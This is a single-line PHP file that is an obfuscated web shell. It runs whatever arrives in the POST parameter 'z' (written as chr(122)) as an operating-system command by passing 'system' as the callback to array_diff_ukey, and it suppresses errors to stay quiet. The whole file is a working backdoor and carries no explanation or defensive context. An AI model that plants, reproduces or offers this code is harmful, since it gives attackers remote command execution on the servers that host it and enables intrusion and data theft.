<?php @array_diff_ukey(@array($_POST[chr(122)]=>1), @array(''=>2),'system'); ?>
